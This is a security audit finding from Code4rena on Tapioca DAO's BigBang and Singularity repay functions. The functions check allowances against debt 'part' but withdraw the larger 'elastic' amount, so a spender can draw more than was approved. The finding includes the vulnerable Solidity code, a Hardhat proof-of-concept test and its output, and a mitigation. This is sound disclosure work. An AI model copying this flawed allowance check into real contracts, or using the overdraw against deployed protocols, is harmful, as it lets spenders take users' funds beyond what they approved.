---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/lending
  - sector/staking
  - sector/token
protocol: "[[Tapioca DAO]]"
auditors:
  - "[[zzzitron]]"
report: "https://code4rena.com/reports/2023-07-tapioca"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[vote-delegation-loop]]"
---
# [H-44] `BigBang::repay` and `Singularity::repay` spend more than allowed amount

- id: 27534
- impact: HIGH
- protocol: [[Tapioca DAO]]
- reporter: zzzitron (Code4rena)
- source: https://code4rena.com/reports/2023-07-tapioca

## Summary


This bug report is about the misuse of `part` and `elastic` in the `BigBang` and `Singularity` contracts. When an user allows certain amount to a spender, the spender can spend more than the allowance due to the discrepancy between the allowance and actually spendable amount, which is likely to grow in time.

The function `BigBang::repay` uses `part` to check for the allowance, but the `BigBang::_repay` draws actually the corresponding `elastic` of the `part` from the `from` address. Similarly, the `Singularity::repay` will delegate call on the `SGLBorrow::repay`, which has the modifier of `allowedBorrow(from, part)`. Then, `amount` is calculated from the `part`, and the `amount` is pulled from the `from` address. The `amount` is likely to be bigger than the `part`, since the calculation is based on the `totalBorrow`'s ratio between `elastic` and `base`.

A proof of concept was provided to demonstrate that more asset was pulled than allowed, which can be found in the `test/bigBang.test.ts` in the tapiocabar-audit repo. The result of the proof of concept showed that `1000136987569097987` was pulled from the eoa1, which is more than the allowance (i.e. 1e18).

The recommended mitigation steps for this issue is to calculate the actual amount to be pulled and use the amount to check the allowance instead of using the `part`.

## Details


<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L52>

When an user allows certain amount to a spender, the spender can spend more than the allowance.

Note that this is a different issue from the misuse of `allowedBorrow` for the share amount
(i.e. issue "`BigBang::repay` uses `allowedBorrow` with the asset amount, whereas other functions use it with share of collateral"), as the fix in the other issue will not mitigate this issue.
This issue is the misuse of `part` and `elastic`, whereas the other issue is the misuse of the `share` and `asset`.

### Proof of Concept

The spec in the `MarketERC20::approve` function specifies that the approved amount is the maximum amount that the spender can draw.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/364dead3a42b06a34c802eee951cea1a654d438e/contracts/markets/MarketERC20.sol#L189-L200>

        /// @notice Approves `amount` from sender to be spend by `spender`.
        /// @param spender Address of the party that can draw from msg.sender's account.
        /// @param amount The maximum collective amount that `spender` can draw.
        /// @return (bool) Returns True if approved.
        function approve( 
            address spender,
            uint256 amount
        ) public override returns (bool) {

However, the spender can draw more than the allowance if the `totalBorrow.base` is more thant `totalBorrow.elastic`, which is likely condition.

The proof of concept below demonstrates that more asset was pulled than allowed.
It is only a part of proof of concept; to see the full proof of concept see <https://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9>
To use it, put it in the `test/bigBang.test.ts` in the tapiocabar-audit repo

The eoa1 allows deployer 1e18. After the `timeTravel`, the elastic of `totalBorrow` is more than the `base`. Under the condition, the deployer uses the allowance with the `BigBang::repay` function. As the result, more asset than allowance was pulled from eoa1.

```javascript
        it('should not allow repay more PoCRepayMoreThanAllowed', async () => {
            
            ////////
            // setup steps are omitted
            // the full proof of concept is
            // https://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9
            ////////

            // eoa1 allows deployer (it should be `approve`, if the modifier in the repay is `allowedLend`)
            const allowedPart = ethers.BigNumber.from((1e18).toString());
            await wethBigBangMarket.connect(eoa1).approveBorrow(deployer.address, allowedPart);

            //repay from eoa1
            // check more than the allowed amount is pulled from yieldBox
           
            timeTravel(10 * 86400);

            // repay from eoa1 the allowed amount
            // balance before repay of eoa in the yieldBox for the asset
            const usdoAssetId = await wethBigBangMarket.assetId();
            const eoa1ShareBalanceBefore = await yieldBox.balanceOf(eoa1.address, usdoAssetId);
            const eoa1AmountBefore = await yieldBox.toAmount(usdoAssetId, eoa1ShareBalanceBefore, false);
            await wethBigBangMarket.repay(
                eoa1.address,
                deployer.address,
                false,
                allowedPart,
            );
            const eoa1ShareBalanceAfter = await yieldBox.balanceOf(eoa1.address, usdoAssetId);
            const eoa1AmountAfter = await yieldBox.toAmount(usdoAssetId, eoa1ShareBalanceAfter, false);
            console.log(eoa1AmountBefore.sub(eoa1AmountAfter).toString());
            expect(eoa1AmountBefore.sub(eoa1AmountAfter).gt(allowedPart)).to.be.true;
        });
```

The result of the poc is below, which shows that `1000136987569097987` is pulled from the eoa1, which is more than the allowance (i.e. 1e18).

      BigBang test
        poc
    1000136987569097987
          ✔ should not allow repay more PoCRepayMoreThanAllowed (11934ms)

The same issue is also in the `Singularity`. In the same manner shown above, the spender will pull more than allowed when the `totalBorrow.elastic` is bigger than the `totalBorrow.base`.

### Details of the bug

The function `BigBang::repay` uses `part` to check for the allowance.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268>

However, the `BigBang::_repay` draws actually the corresponding `elastic` of the `part` from the `from` address.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732>

```solidity
    function _repay(
        address from,
        address to,
        uint256 part
    ) internal returns (uint256 amount) {
        (totalBorrow, amount) = totalBorrow.sub(part, true);

        userBorrowPart[to] -= part;

        uint256 toWithdraw = (amount - part); //acrrued
        uint256 toBurn = amount - toWithdraw;
        yieldBox.withdraw(assetId, from, address(this), amount, 0);
```

The similar lines of code is also in the `Singularity`. The `Singularity::repay` will delegate call on the `SGLBorrow::repay`, which has the modifier of `allowedBorrow(from, part)`:

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L51>

```solidity
// SGLBorrow

    function repay(
        address from,
        address to,
        bool skim,
        uint256 part
    ) public notPaused allowedBorrow(from, part) returns (uint256 amount) {
        updateExchangeRate();

```

Then, `amount` is calculated from the `part`, and the `amount` is pulled from the `from` address in the below code snippet.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95>

```solidity
    function _repay(
        address from,
        address to,
        bool skim,
        uint256 part
    ) internal returns (uint256 amount) {
        (totalBorrow, amount) = totalBorrow.sub(part, true);

        userBorrowPart[to] -= part;

        uint256 share = yieldBox.toShare(assetId, amount, true);
        uint128 totalShare = totalAsset.elastic;
        _addTokens(from, to, assetId, share, uint256(totalShare), skim);
        totalAsset.elastic = totalShare + uint128(share);
        emit LogRepay(skim ? address(yieldBox) : from, to, amount, part);
    }
```

The `amount` is likely to be bigger than the `part`, since the calculation is based on the `totalBorrow`'s ratio between `elastic` and `base`.
Then the `amount` is used to withdraw from `from` address, meaning that more than the allowance is withdrawn.

The discrepancy between the allowance and actually spendable amount is going to grow in time, as the `totalBorrow`'s elastic will outgrow the base in time.

### Tools Used

Hardhat

### Recommended Mitigation Steps

Instead of using the `part` to check the allowance, calculate the actual amount to be pulled and use the amount to check the allowance.

<!-- zzzitron H-BigBang-PoCRepayMoreThanAllowed -->

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/918#issuecomment-1701266875)**

***
